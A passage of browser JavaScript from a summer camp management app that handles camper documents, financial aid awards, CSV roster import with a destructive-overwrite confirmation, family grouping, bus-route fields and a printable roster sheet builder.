    return docs.map(function(d,i){var icon=d.type&&d.type.includes('pdf')?'📄':'📎';return'<div style="display:flex;align-items:center;gap:8px;padding:4px 0;font-size:.8rem"><span>'+icon+'</span><a href="'+esc(d.data)+'" download="'+esc(d.name)+'" style="color:var(--me);flex:1">'+esc(d.name)+'</a><span style="font-size:.65rem;color:var(--s400)">'+(d.size?Math.round(d.size/1024)+'KB':'')+'</span><button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err);font-size:.6rem" onclick="CampistryMe._removeDoc(\''+je(camperName)+'\','+i+')">x</button></div>'}).join('');
}
function _removeDoc(n,i){if(!roster[n]||!roster[n].documents)return;roster[n].documents.splice(i,1);save();viewCamper(n);toast('Removed')}

// ═══════════════════════════════════════════════════════════════
// SCHOLARSHIP / FINANCIAL AID
// ═══════════════════════════════════════════════════════════════
function addScholarship(camperName){
    var h='<div class="me-modal-form"><p style="font-size:.85rem;color:var(--s600);margin-bottom:12px">Award aid to <strong>'+esc(camperName)+'</strong></p><div class="me-field"><label>Type</label><select id="aidType" class="me-input"><option>Scholarship</option><option>Financial Aid</option><option>Campership</option><option>Staff Discount</option><option>Donor Sponsored</option></select></div><div style="display:grid;grid-template-columns:1fr 1fr;gap:10px"><div class="me-field"><label>Amount ($)</label><input type="number" id="aidAmt" class="me-input" step="0.01" min="0"></div><div class="me-field"><label>Source</label><input type="text" id="aidSrc" class="me-input" placeholder="Donor or fund name"></div></div><div class="me-field"><label>Notes</label><input type="text" id="aidNotes" class="me-input"></div></div>';
    showModal('Award Financial Aid',h,function(){
        var amt=parseFloat(document.getElementById('aidAmt').value)||0;if(!amt){toast('Enter amount','error');return}
        if(!roster[camperName])return;if(!roster[camperName].scholarships)roster[camperName].scholarships=[];
        roster[camperName].scholarships.push({type:document.getElementById('aidType').value,amount:amt,source:(document.getElementById('aidSrc').value||'').trim(),notes:(document.getElementById('aidNotes').value||'').trim(),date:new Date().toISOString().split('T')[0]});
        var famKey=Object.keys(families).find(function(k){return(families[k].camperIds||[]).indexOf(camperName)>=0});
        if(famKey){if(!families[famKey].credits)families[famKey].credits=[];families[famKey].credits.push({id:'sch_'+Date.now(),reason:document.getElementById('aidType').value+' for '+camperName,amount:amt,date:new Date().toISOString().split('T')[0]});families[famKey].balance=Math.max(0,(families[famKey].balance||0)-amt)}
        save();closeModal('dynModal');viewCamper(camperName);toast(fm(amt)+' awarded to '+camperName);
    });
}

// ═══════════════════════════════════════════════════════════════
// DUPLICATE DETECTION
// ═══════════════════════════════════════════════════════════════
// ── CSV ──────────────────────────────────────────────────────────
var CSV_HEADERS=['First Name','Last Name','Date of Birth','Gender','School Name','School Grade','Teacher','Division','Grade','Bunk','Street Address','City','State','ZIP','Parent 1 Name','Parent 1 Phone','Parent 1 Email','Emergency Name','Emergency Phone','Emergency Relation','Allergies','Medications','Dietary Restrictions'];

function downloadTemplate(){
    // Build template with headers + league columns
    var leagues=getLeagues();var leagueNames=Object.keys(leagues).sort();
    var headers=CSV_HEADERS.slice();
    leagueNames.forEach(function(lg){headers.push('Team: '+lg)});
    var csv='\uFEFF'+headers.map(function(h){return'"'+h+'"'}).join(',')+'\n';
    // Add 2 example rows
    csv+='"John","Smith","2015-03-15","Male","PS 123","3rd","Mrs. Johnson","Juniors","3rd Grade","Bunk 1","123 Main St","Brooklyn","NY","11230","Jane Smith","555-123-4567","jane@email.com","Bob Smith","555-987-6543","Uncle","Peanuts","",""\n';
    csv+='"Sarah","Cohen","2014-07-22","Female","Yeshiva Academy","4th","Rabbi Goldstein","Seniors","4th Grade","Bunk 7","456 Oak Ave","Woodmere","NY","11598","Rachel Cohen","555-222-3333","rachel@email.com","David Cohen","555-444-5555","Father","","Inhaler","Dairy-free"\n';
    csv+='"","","","","","","","","","","","","","","","","","","","","","",""\n';
    var a=document.createElement('a');
    a.href=URL.createObjectURL(new Blob([csv],{type:'text/csv'}));
    a.download='campistry_camper_template.csv';
    a.click();
    toast('Template downloaded — fill it out and import');
}

function handleCsv(file){
    if(!file)return;
    var reader=new FileReader();
    reader.onload=function(e){
        var text=e.target.result;
        if(text.charCodeAt(0)===0xFEFF)text=text.slice(1);
        var lines=text.split(/\r?\n/).filter(function(l){return l.trim()});
        if(!lines.length)return;

        // Parse header row to find column indices
        var hdr=parseCsvLine(lines[0]).map(function(h){return h.toLowerCase().trim()});
        var col=function(names){
            for(var i=0;i<names.length;i++){var idx=hdr.findIndex(function(h){return h.includes(names[i])});if(idx>=0)return idx}
            return-1;
        };

        var iFirst=col(['first name','first']);
        var iLast=col(['last name','last']);
        var iName=col(['name','camper']);
        var iDob=col(['date of birth','dob','birth']);
        var iGender=col(['gender','sex']);
        var iSchool=col(['school name','school']);
        var iSchoolGr=col(['school grade']);
        var iTeacher=col(['teacher']);
        var iDiv=col(['division']);
        var iGrade=col(['grade']);
        var iBunk=col(['bunk','cabin']);
        var iStreet=col(['street','address']);
        var iCity=col(['city']);
        var iState=col(['state']);
        var iZip=col(['zip','postal']);
        var iP1=col(['parent 1 name','parent name','parent1','mother','father']);
        var iP1Ph=col(['parent 1 phone','parent phone','parent1 phone']);
        var iP1Em=col(['parent 1 email','parent email','parent1 email']);
        var iEmN=col(['emergency name','emergency contact']);
        var iEmPh=col(['emergency phone']);
        var iEmR=col(['emergency relation']);
        var iAlg=col(['allergies','allergy']);
        var iMed=col(['medications','medication','meds']);
        var iDiet=col(['dietary','diet']);

        // Find league team columns (headers like "Team: League Name")
        var leagueCols={};
        hdr.forEach(function(h,idx){
            var m=h.match(/^team:\s*(.+)/i);
            if(m)leagueCols[m[1].trim()]=idx;
        });

        var start=1; // skip header
        var rows=[];
        for(var i=start;i<Math.min(lines.length,5001);i++){
            var c=parseCsvLine(lines[i]);
            var firstName=(iFirst>=0?c[iFirst]:'').trim();
            var lastName=(iLast>=0?c[iLast]:'').trim();
            var fullName='';
            if(firstName||lastName){fullName=(firstName+' '+lastName).trim()}
            else if(iName>=0){fullName=(c[iName]||'').trim()}
            if(!fullName)continue;

            var teams={};
            Object.entries(leagueCols).forEach(function([lg,idx]){
                var v=(c[idx]||'').trim();
                if(v)teams[lg]=v;
            });

            rows.push({
                name:fullName,
                dob:iDob>=0?(c[iDob]||'').trim():'',
                gender:iGender>=0?(c[iGender]||'').trim():'',
                school:iSchool>=0?(c[iSchool]||'').trim():'',
                schoolGrade:iSchoolGr>=0?(c[iSchoolGr]||'').trim():'',
                teacher:iTeacher>=0?(c[iTeacher]||'').trim():'',
                division:iDiv>=0?(c[iDiv]||'').trim():'',
                grade:iGrade>=0?(c[iGrade]||'').trim():'',
                bunk:iBunk>=0?(c[iBunk]||'').trim():'',
                street:iStreet>=0?(c[iStreet]||'').trim():'',
                city:iCity>=0?(c[iCity]||'').trim():'',
                state:iState>=0?(c[iState]||'').trim():'',
                zip:iZip>=0?(c[iZip]||'').trim():'',
                parent1Name:iP1>=0?(c[iP1]||'').trim():'',
                parent1Phone:iP1Ph>=0?(c[iP1Ph]||'').trim():'',
                parent1Email:iP1Em>=0?(c[iP1Em]||'').trim():'',
                emergencyName:iEmN>=0?(c[iEmN]||'').trim():'',
                emergencyPhone:iEmPh>=0?(c[iEmPh]||'').trim():'',
                emergencyRel:iEmR>=0?(c[iEmR]||'').trim():'',
                allergies:iAlg>=0?(c[iAlg]||'').trim():'',
                medications:iMed>=0?(c[iMed]||'').trim():'',
                dietary:iDiet>=0?(c[iDiet]||'').trim():'',
                teams:teams
            });
        }

        if(rows.length){
            var pvEl=document.getElementById('csvPV');
            if(pvEl){pvEl.style.display='block';pvEl.innerHTML='<div style="font-weight:600;margin:8px 0 4px">'+rows.length+' campers found</div><div style="font-size:.75rem;color:var(--s400)">Columns detected: '+hdr.filter(function(h){return h}).length+'</div>'}
            var btn=document.getElementById('csvBtn');
            if(btn){btn.disabled=false;btn.onclick=async function(){
                // ★ #3 + footgun: importRows WIPES all current campers/structure/families/bunks
                //   (and fans the wipe to cloud) — confirm first. Also, roster is keyed by NAME,
                //   so duplicate-name rows would silently overwrite each other; de-dupe (last
                //   wins, matching the overwrite semantics) and warn so the count is honest.
                var byName={},dupNames=[];
                rows.forEach(function(r){ if(byName[r.name])dupNames.push(r.name); byName[r.name]=r; });
                var uniqueRows=Object.keys(byName).map(function(n){return byName[n]});
                var msg='Import will REPLACE all current campers, divisions, grades, bunks, and families with this file ('+uniqueRows.length+' camper'+(uniqueRows.length===1?'':'s')+'). This cannot be undone.';
                if(dupNames.length){var ex=dupNames.slice(0,3).join(', ');msg+='<br><br>⚠ '+dupNames.length+' duplicate name'+(dupNames.length===1?'':'s')+' ('+esc(ex)+(dupNames.length>3?'…':'')+') — only the last row of each will be kept.';}
                var ok=await confirmDialog({title:'Replace All Camp Data?',message:msg,confirmLabel:'Import & Replace',danger:true});
                if(!ok)return;
                importRows(uniqueRows);
            }}
        }
    };
    reader.readAsText(file);
}

function parseCsvLine(line){
    var result=[],cur='',inQ=false;
    for(var i=0;i<line.length;i++){
        var ch=line[i];
        if(inQ){if(ch==='"'&&line[i+1]==='"'){cur+='"';i++}else if(ch==='"'){inQ=false}else{cur+=ch}}
        else{if(ch==='"'){inQ=true}else if(ch===','){result.push(cur);cur=''}else{cur+=ch}}
    }
    result.push(cur);
    return result;
}

function importRows(rows){
    var added=0,updated=0,newDivisions=0,newGrades=0,newBunks=0,newFamilies=0;

    // ═══ WIPE EXISTING DATA — CSV is the new source of truth ═══
    roster={};
    structure={};
    families={};
    bunkAsgn={};
    nextCamperId=1;
    // Clear Go addresses too
    try{var goRaw=localStorage.getItem('campistry_go_data');var goData=goRaw?JSON.parse(goRaw):{};goData.addresses={};localStorage.setItem('campistry_go_data',JSON.stringify(goData))}catch(e){}
    // Also wipe the cloud settings so stale data doesn't survive
    // ★ Preserve existing grade times (startTime/endTime) from app1.divisions
    //   so they survive re-imports. Times are configured in Flow and are
    //   independent of camper/roster data.
    var _preservedGradeTimes={};
    try{
        var g=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
        // Snapshot grade times before wiping
        if(g.app1&&g.app1.divisions){
            Object.entries(g.app1.divisions).forEach(function(pair){
                var k=pair[0],v=pair[1];
                if(v&&(v.startTime||v.endTime)){
                    _preservedGradeTimes[k]={startTime:v.startTime||'',endTime:v.endTime||''};
                }
            });
        }
        g.campStructure={};
        if(!g.app1)g.app1={};
        g.app1.camperRoster={};
        g.app1.divisions={};
        if(!g.campistryMe)g.campistryMe={};
        g.campistryMe.families={};
        g.campistryMe.bunkAssignments={};
        g.campistryMe.nextCamperId=1;
        localStorage.setItem('campGlobalSettings_v1',JSON.stringify(g));
        // Fan the wipe out to cloud — otherwise the next hydration
        // re-pulls the pre-wipe roster/families and undoes the reset.
        if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function'){
            window.saveGlobalSettings('campStructure',g.campStructure);
            window.saveGlobalSettings('app1',g.app1);
            window.saveGlobalSettings('campistryMe',g.campistryMe);
        }
    }catch(e){}

    // ═══ PASS 1: Build camp structure from CSV data ═══
    rows.forEach(function(r){
        if(r.division){
            if(!structure[r.division]){
                structure[r.division]={color:COLORS[Object.keys(structure).length%COLORS.length],grades:{}};
                newDivisions++;
            }
            if(r.grade&&!structure[r.division].grades[r.grade]){
                structure[r.division].grades[r.grade]={bunks:[]};
                newGrades++;
            }
            if(r.grade&&r.bunk&&structure[r.division].grades[r.grade]&&structure[r.division].grades[r.grade].bunks.indexOf(r.bunk)===-1){
                structure[r.division].grades[r.grade].bunks.push(r.bunk);
                newBunks++;
            }
        }
    });

    // ═══ PASS 2: Create campers ═══
    // roster is keyed by full name (wiped to {} above), and nearly every
    // other system built on top of it — bunk assignment, bunk staff,
    // families, enrollments, Link invites/tips/mail — joins on that SAME
    // name string, not the numeric camperId. Two rows sharing an identical
    // name would otherwise silently collide: the second row overwrites the
    // first in roster with zero warning. Track and report it instead.
    var _importDupeNames=[];
    rows.forEach(function(r){
        if(roster[r.name])_importDupeNames.push(r.name);
        added++;
        var existingId=nextCamperId;nextCamperId++;

        roster[r.name]={
            camperId:existingId,
            dob:r.dob||'',
            gender:r.gender||'',
            school:r.school||'',
            schoolGrade:r.schoolGrade||'',
            teacher:r.teacher||'',
            division:r.division||'',
            grade:r.grade||'',
            bunk:r.bunk||'',
            street:r.street||'',
            city:r.city||'',
            state:r.state||'',
            zip:r.zip||'',
            parent1Name:r.parent1Name||'',
            parent1Phone:r.parent1Phone||'',
            parent1Email:r.parent1Email||'',
            emergencyName:r.emergencyName||'',
            emergencyPhone:r.emergencyPhone||'',
            emergencyRel:r.emergencyRel||'',
            allergies:r.allergies||'',
            medications:r.medications||'',
            dietary:r.dietary||'',
            teams:r.teams||{},
            team:Object.values(r.teams)[0]||''
        };

        // Sync address to Go
        if(roster[r.name].street)syncAddressToGo(r.name,roster[r.name]);
    });

    // ═══ PASS 3: Auto-generate families from parent data ═══
    // Cluster imported campers into families with the 3-of-4 rule (last name,
    // address, parent email, parent name) — never on a shared last name alone.
    var impItems=[];
    rows.forEach(function(r){
        if(!r.parent1Name)return;
        impItems.push(_famItemRaw(r.name,r.street,r.city,r.state,r.zip,r.parent1Name,r.parent1Email));
    });
    var impUf=impItems.map(function(_,i){return i});
    function impFind(i){while(impUf[i]!==i){impUf[i]=impUf[impUf[i]];i=impUf[i]}return i}
    for(var ii=0;ii<impItems.length;ii++){
        for(var jj=ii+1;jj<impItems.length;jj++){
            if(_famShouldLink(impItems[ii],impItems[jj]))impUf[impFind(ii)]=impFind(jj);
        }
    }
    var impGroups={};
    impItems.forEach(function(it,i){var r=impFind(i);(impGroups[r]=impGroups[r]||[]).push(it)});
    Object.keys(impGroups).forEach(function(gk){
        var grp=impGroups[gk];
        var rep=grp[0];
        var camperNames=grp.map(function(g){return g.name});
        // Match an existing family (already-listed campers, or a 3-of-4 match).
        var famKey=null;
        camperNames.forEach(function(cn){ if(!famKey) famKey=_resolveFamilyKey(cn,rep); });
        if(famKey&&families[famKey]){
            camperNames.forEach(function(cn){ if(families[famKey].camperIds.indexOf(cn)===-1)families[famKey].camperIds.push(cn); });
        }else{
            var rc=roster[rep.name]||{};
            famKey='fam_'+(rep.lastName||'').toLowerCase().replace(/[^a-z0-9]/g,'')+'_'+(rc.camperId||('imp'+gk));
            families[famKey]={
                name:(rep.lastName||'Family')+' Family',
                households:[{
                    label:'Primary',
                    parents:[{name:rc.parent1Name||'',phone:rc.parent1Phone||'',email:rc.parent1Email||'',relation:'Parent'}],
                    address:[rc.street,rc.city,rc.state,rc.zip].filter(Boolean).join(', '),
                    billingContact:true
                }],
                camperIds:camperNames.slice(),
                balance:0,totalPaid:0,
                notes:'Auto-created from CSV import'
            };
            newFamilies++;
        }
    });

    // ═══ PASS 4: Auto-populate bunk assignments ═══
    rows.forEach(function(r){
        if(r.bunk&&r.name){
            if(!bunkAsgn[r.bunk])bunkAsgn[r.bunk]=[];
            if(bunkAsgn[r.bunk].indexOf(r.name)===-1)bunkAsgn[r.bunk].push(r.name);
        }
    });

    // ═══ SAVE & REPORT ═══
    save();

    // ★ Restore preserved grade times into app1.divisions
    //   save() writes campStructure but deliberately skips app1.divisions
    //   (owned by app1/Flow). We write the preserved times as stub entries
    //   so that when app1.loadData() next rebuilds divisions from the new
    //   campStructure, it finds times in existingTimes and carries them over.
    if(Object.keys(_preservedGradeTimes).length>0){
        try{
            var curSettings=window.loadGlobalSettings?.() || {};
            var curApp1=curSettings.app1||{};
            var restoredDivs=curApp1.divisions||{};
            var timesRestored=0;
            Object.entries(_preservedGradeTimes).forEach(function(pair){
                var gradeName=pair[0],times=pair[1];
                // Create or update the entry — app1.loadData() reads startTime/endTime
                // from these entries via its existingTimes snapshot (app1.js ~line 874-884)
                if(!restoredDivs[gradeName])restoredDivs[gradeName]={};
                restoredDivs[gradeName].startTime=times.startTime;
                restoredDivs[gradeName].endTime=times.endTime;
                timesRestored++;
            });
            if(timesRestored>0){
                curApp1.divisions=restoredDivs;
                window.saveGlobalSettings?.('app1',curApp1);
                console.log('[Me] Restored grade times for',timesRestored,'grades after import');
            }
        }catch(e){console.warn('[Me] Failed to restore grade times:',e)}
    }

    closeModal('csvModal');render(curPage);

    // Build summary
    var summary=added+' campers imported';
    if(newDivisions>0)summary+=', '+newDivisions+' division'+(newDivisions>1?'s':'');
    if(newGrades>0)summary+=', '+newGrades+' grade'+(newGrades>1?'s':'');
    if(newBunks>0)summary+=', '+newBunks+' bunk'+(newBunks>1?'s':'');
    if(newFamilies>0)summary+=', '+newFamilies+' famil'+(newFamilies>1?'ies':'y');
    summary+=' — previous data replaced';
    if(_importDupeNames.length>0){
        var uniqDupes=Array.from(new Set(_importDupeNames));
        summary+=' — ⚠ '+uniqDupes.length+' duplicate name'+(uniqDupes.length>1?'s':'')+' in this file (only the last row for each was kept: '+uniqDupes.join(', ')+')';
        console.warn('[Me] CSV import: duplicate camper name(s) collided in roster —',uniqDupes);
    }
    toast(summary);
    console.log('[Me] CSV import (full overwrite):',summary);
}


// ═══ BOOT ════════════════════════════════════════════════════════
if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',init);else init();

// ═══════════════════════════════════════════════════════════════
// PRINT SHEETS — user-built printable rosters (columns × rows)
// A camp can design a sheet, choose exactly what each column holds
// (first name, parent address, bunk, allergies, a blank write-in
// column, …), and print one sheet per bunk / grade / division / team.
// Columns left unconfigured never print. Templates persist to cloud.
// ═══════════════════════════════════════════════════════════════
var psEditingId=null; // id of the sheet open in the builder, or null for the list

// Catalog of fields a column can hold. Custom fields (Settings → Custom
// Fields) are appended so anything the camp tracks can be printed.
function psFields(){
    loadCustomFields();
    var f=[
        {key:'firstName',label:'First Name'},
        {key:'lastName',label:'Last Name'},
        {key:'fullName',label:'Full Name'},
        {key:'altName',label:'Alternate Name'},
        {key:'camperId',label:'Camper ID'},
        {key:'division',label:'Division'},
        {key:'grade',label:'Grade'},
        {key:'bunk',label:'Bunk'},
        {key:'team',label:'League Team'},
        {key:'dob',label:'Date of Birth'},
        {key:'age',label:'Age'},
        {key:'gender',label:'Gender'},
        {key:'school',label:'School'},
        {key:'schoolGrade',label:'School Grade'},
        {key:'teacher',label:'Teacher'},
        {key:'parent1Name',label:'Parent / Guardian'},
        {key:'parent1Phone',label:'Parent Phone'},
        {key:'parent1Email',label:'Parent Email'},
        {key:'street',label:'Street'},
        {key:'city',label:'City'},
        {key:'state',label:'State'},
        {key:'zip',label:'ZIP'},
        {key:'address',label:'Full Address'},
        {key:'allergies',label:'Allergies'},
        {key:'medications',label:'Medications'},
        {key:'dietary',label:'Dietary'},
        {key:'emergencyName',label:'Emergency Contact'},
        {key:'emergencyPhone',label:'Emergency Phone'},
        {key:'emergencyRel',label:'Emergency Relation'},
        // Bus routes, pulled live from Campistry Go. Dismissal and arrival are
        // separate fields because a camper routinely rides a different bus
        // each way — one "Bus" column would be quietly wrong half the time.
        {key:'busRoute',label:'Bus — Dismissal (PM)'},
        {key:'busStop',label:'Bus Stop # — Dismissal'},
        {key:'busStopAddress',label:'Bus Stop Address — Dismissal'},
        {key:'busShift',label:'Bus Shift — Dismissal'},
        {key:'busMonitor',label:'Bus Monitor — Dismissal'},
        {key:'busAmRoute',label:'Bus — Arrival (AM)'},
        {key:'busAmStop',label:'Bus Stop # — Arrival'},
        {key:'busAmStopAddress',label:'Bus Stop Address — Arrival'},
        {key:'__blank',label:'Blank / write-in column'}
    ];
    (customFields||[]).forEach(function(cf){f.push({key:'cf_'+cf.id,label:cf.label})});
    return f;
}
function psFieldLabel(key){
    if(!key)return'';
    var m=psFields().filter(function(f){return f.key===key})[0];
    return m?m.label:key;
}
// Resolve a field's value for one camper. name is the roster key.
function psValue(field,name,c){
    if(!field||field==='__blank')return'';
    c=c||{};
    var parts=(name||'').split(' ');
    switch(field){
        case'firstName':return parts[0]||'';
        case'lastName':return parts.slice(1).join(' ')||'';
        case'fullName':return name||'';
        case'altName':return[c.altFirstName,c.altLastName].filter(Boolean).join(' ');
        case'camperId':return c.camperId?String(c.camperId).padStart(4,'0'):'';
        case'age':return String(age(c.dob)||'');
        case'dob':return c.dob?formatDateLocale(c.dob):'';
        case'address':{
            var line2=[c.city,c.state].filter(Boolean).join(', ');
            if(c.zip)line2=(line2?line2+' ':'')+c.zip;
            return[c.street,line2].filter(Boolean).join(', ');
        }
        case'team':return c.team||Object.values(c.teams||{})[0]||'';
        case'busRoute':        return _busVal(name,'dismissal','busName');
        case'busStop':         return _busVal(name,'dismissal','stopNum');
        case'busStopAddress':  return _busVal(name,'dismissal','address');
        case'busShift':        return _busVal(name,'dismissal','shift');
        case'busMonitor':      return _busVal(name,'dismissal','monitor');
        case'busAmRoute':      return _busVal(name,'arrival','busName');
        case'busAmStop':       return _busVal(name,'arrival','stopNum');
        case'busAmStopAddress':return _busVal(name,'arrival','address');
        default:return c[field]!=null?String(c[field]):'';
    }
}

// ── Bus routes (from Campistry Go) ───────────────────────────────
// Go strips savedRoutes out of campGlobalSettings_v1 (road geometry blows the
// localStorage quota), so they can't be read the way every other field is.
// campistry_bus_routes.js knows the real locations; we cache the built index
// here because psValue is called once per camper per column and rebuilding it
// each time would walk every route on every cell.
var _busIndex=null, _busLoading=false;

function _busVal(name,mode,attr){
    var idx=_busIdx();
    if(!idx)return'';
    var API=window.CampistryBusRoutes;
    var row=API?API.forCamper(idx,name,mode):null;
    if(!row)return'';
    var v=row[attr];
    return v==null?'':String(v);
}

function _busIdx(){
    var API=window.CampistryBusRoutes;
    if(!API)return null;
    if(_busIndex)return _busIndex;
    _busIndex=API.index(API.loadLocal());
    // Nothing local means Go hasn't been opened on this device. Pull the
    // durable copy and re-render once — without this, print sheets on a fresh
    // browser would silently show blank bus columns.
    if(!Object.keys(_busIndex).length&&!_busLoading){
        _busLoading=true;
        try{
            var db=window.CampistryDB;
            var client=db&&db.getClient&&db.getClient();
            var campId=db&&db.getCampId&&db.getCampId();
            API.loadCloud(client,campId).then(function(blob){
                _busLoading=false;
                if(!blob)return;
                var next=API.index(blob);
                if(!Object.keys(next).length)return;
                _busIndex=next;
                if(curPage==='printsheets')render('printsheets');
            });
        }catch(e){_busLoading=false}
    }
    return _busIndex;
}

/** True when we have any route data — used to warn before printing a blank column. */
function _busHasData(){
    var idx=_busIdx();
    return !!(idx&&Object.keys(idx).length);
}

// ── template + column model ──
function psGet(id){return printSheets.filter(function(s){return s.id===id})[0]||null}
function psColHeader(col){return(col.header&&col.header.trim())||psFieldLabel(col.field)}
// A column prints only when it has "something inside": a real field, or a
// write-in column the user gave a header to.
function psColPrints(col){
    if(!col||!col.field)return false;
    if(col.field==='__blank')return!!(col.header&&col.header.trim());
    return true;
}
// Columns to actually render. When hideEmptyCols is on, data columns that
// are blank for every camper are dropped too (write-in columns are kept).
function psActiveColumns(sheet,rows){
    var cols=(sheet.columns||[]).filter(psColPrints);
    if(sheet.hideEmptyCols!==false&&rows&&rows.length){
        cols=cols.filter(function(col){
            if(col.field==='__blank')return true;
            return rows.some(function(r){return psValue(col.field,r[0],r[1]).trim()!==''});
        });
    }
    return cols;
}

// ── camper selection, sorting, grouping ──
function psFilteredCampers(sheet){
    var rows=Object.entries(roster);
    if(sheet.scopeDiv)rows=rows.filter(function(r){return r[1].division===sheet.scopeDiv});
    var sortKey=sheet.sortBy||'lastName';
    rows.sort(function(a,b){
        var va,vb;
        if(sortKey==='camperId'){va=a[1].camperId||0;vb=b[1].camperId||0;return va-vb}
        if(sortKey==='firstName'){va=(a[0].split(' ')[0]||'');vb=(b[0].split(' ')[0]||'')}
        else if(sortKey==='bunk'){va=a[1].bunk||'';vb=b[1].bunk||''}
        else if(sortKey==='grade'){va=a[1].grade||'';vb=b[1].grade||''}
        else{va=(a[0].split(' ').slice(1).join(' ')||a[0]);vb=(b[0].split(' ').slice(1).join(' ')||b[0])}
        return String(va).localeCompare(String(vb),undefined,{numeric:true});
    });
    return rows;
}
function psGroupVal(groupBy,c){
    if(groupBy==='division')return c.division||'';
    if(groupBy==='grade')return c.grade||'';
    if(groupBy==='bunk')return c.bunk||'';
    if(groupBy==='team')return c.team||Object.values(c.teams||{})[0]||'';
    return'';
}
function psOrderedGroups(groupBy){
    var out=[];
    try{
        if(groupBy==='division'){_sortedDivisions().forEach(function(e){out.push(e[0])})}
        else if(groupBy==='grade'){_sortedDivisions().forEach(function(e){_sortedGrades(e[1]).forEach(function(g){if(out.indexOf(g[0])<0)out.push(g[0])})})}
        else if(groupBy==='bunk'){_sortedDivisions().forEach(function(e){_sortedGrades(e[1]).forEach(function(g){(g[1].bunks||[]).forEach(function(b){if(out.indexOf(b)<0)out.push(b)})})})}
        else if(groupBy==='team'){var lg=getLeagues();Object.keys(lg).sort().forEach(function(k){(lg[k]||[]).forEach(function(t){if(out.indexOf(t)<0)out.push(t)})})}
    }catch(e){}
    return out;
}
function psGroups(sheet){
    var rows=psFilteredCampers(sheet);
    if(!sheet.groupBy)return[{label:'',rows:rows}];
    var buckets={};
    rows.forEach(function(r){var v=psGroupVal(sheet.groupBy,r[1])||'__unassigned';(buckets[v]=buckets[v]||[]).push(r)});
    var ordered=psOrderedGroups(sheet.groupBy),result=[];
    ordered.forEach(function(v){if(buckets[v]){result.push({label:v,rows:buckets[v]});delete buckets[v]}});
    Object.keys(buckets).sort().forEach(function(v){if(v!=='__unassigned')result.push({label:v,rows:buckets[v]})});
    if(buckets['__unassigned'])result.push({label:'(Unassigned)',rows:buckets['__unassigned']});
    return result;
}

// ── shared table renderer (preview + print use the same output) ──
function psTableHtml(cols,rows){
    var h='<table class="ps-tbl"><thead><tr>';
    cols.forEach(function(col){h+='<th>'+esc(psColHeader(col))+'</th>'});
    h+='</tr></thead><tbody>';
    if(!rows.length){h+='<tr><td colspan="'+(cols.length||1)+'" class="ps-empty">No campers</td></tr>'}
    rows.forEach(function(r){
        h+='<tr>';
        cols.forEach(function(col){
            var v=col.field==='__blank'?'':psValue(col.field,r[0],r[1]);
            h+='<td'+(col.field==='__blank'?' class="ps-write"':'')+'>'+esc(v)+'</td>';
        });
        h+='</tr>';
    });
    h+='</tbody></table>';
    return h;
}

// ── persistence + CRUD ──
function psSave(){save()}
// Debounced save for while-you-type edits (name, headers) so we don't fire a
// cloud write on every keystroke.
var _psSaveT=null;
function psSaveSoon(){clearTimeout(_psSaveT);_psSaveT=setTimeout(save,600)}
function psNew(){
    var s={id:'ps_'+Date.now()+'_'+Math.floor(Math.random()*1e4),name:'Untitled Sheet',
        columns:[{id:'c1',field:'firstName',header:''},{id:'c2',field:'lastName',header:''},{id:'c3',field:'bunk',header:''}],
        groupBy:'',scopeDiv:'',sortBy:'lastName',hideEmptyCols:true};
    printSheets.push(s);psSave();psEditingId=s.id;renderPrintSheets();
}
function psEdit(id){psEditingId=id;renderPrintSheets()}
function psBack(){psEditingId=null;renderPrintSheets()}
async function psDelete(id){
    var ok=await confirmDialog({title:'Delete Sheet Template?',message:'Delete this sheet template?',confirmLabel:'Delete',danger:true});
    if(!ok)return;
    var i=printSheets.findIndex(function(s){return s.id===id});
    if(i>=0)printSheets.splice(i,1);
    psSave();if(psEditingId===id)psEditingId=null;renderPrintSheets();toast('Sheet deleted');
}
function psDuplicate(id){
    var s=psGet(id);if(!s)return;
    var copy=JSON.parse(JSON.stringify(s));
    copy.id='ps_'+Date.now()+'_'+Math.floor(Math.random()*1e4);
    copy.name=(s.name||'Sheet')+' (copy)';
    printSheets.push(copy);psSave();renderPrintSheets();toast('Sheet duplicated');
}
function psRename(id,v){var s=psGet(id);if(!s)return;s.name=v;psSaveSoon()}
function psSetProp(id,prop,v){var s=psGet(id);if(!s)return;s[prop]=v;psSave();renderPrintSheets()}
function psToggleHideEmpty(id,checked){var s=psGet(id);if(!s)return;s.hideEmptyCols=!!checked;psSave();renderPrintSheets()}
function psAddColumn(id){
    var s=psGet(id);if(!s)return;
    (s.columns=s.columns||[]).push({id:'c'+Date.now(),field:'',header:''});
    psSave();renderPrintSheets();
}
function psRemoveColumn(id,colId){
    var s=psGet(id);if(!s)return;
    s.columns=(s.columns||[]).filter(function(c){return c.id!==colId});
    psSave();renderPrintSheets();
}
function psMoveColumn(id,colId,dir){
    var s=psGet(id);if(!s)return;
    var cols=s.columns||[],i=cols.findIndex(function(c){return c.id===colId}),j=i+dir;
    if(i<0||j<0||j>=cols.length)return;
    var t=cols[i];cols[i]=cols[j];cols[j]=t;
    psSave();renderPrintSheets();
}
// ── column drag-and-drop reordering ──
var _psDragColId=null;
function _psClearDropCues(){
    document.querySelectorAll('.ps-col-row.ps-drop-above,.ps-col-row.ps-drop-below').forEach(function(r){r.classList.remove('ps-drop-above','ps-drop-below')});
}
// The row is only draggable while the ⋮⋮ handle is held — so clicking into the
// field select / header input never starts a drag.
function psColDragHandle(e){var row=e.target.closest('.ps-col-row');if(row)row.setAttribute('draggable','true')}
function psColDragStart(e,colId){
    _psDragColId=colId;
    try{e.dataTransfer.effectAllowed='move';e.dataTransfer.setData('text/plain',colId)}catch(_){}
    var row=e.target.closest('.ps-col-row');if(row)row.classList.add('ps-dragging');
}
function psColDragEnd(e){
    var row=e.target.closest('.ps-col-row');if(row){row.classList.remove('ps-dragging');row.setAttribute('draggable','false')}
    _psClearDropCues();_psDragColId=null;
}
function psColDragOver(e){
    if(!_psDragColId)return;
    e.preventDefault();try{e.dataTransfer.dropEffect='move'}catch(_){}
    var row=e.target.closest('.ps-col-row');if(!row||row.dataset.colid===_psDragColId){_psClearDropCues();return}
    var rect=row.getBoundingClientRect();var after=(e.clientY-rect.top)>rect.height/2;
    _psClearDropCues();row.classList.add(after?'ps-drop-below':'ps-drop-above');
}
function psColDragLeave(e){
    var row=e.target.closest('.ps-col-row');
    if(row&&!row.contains(e.relatedTarget))row.classList.remove('ps-drop-above','ps-drop-below');
}
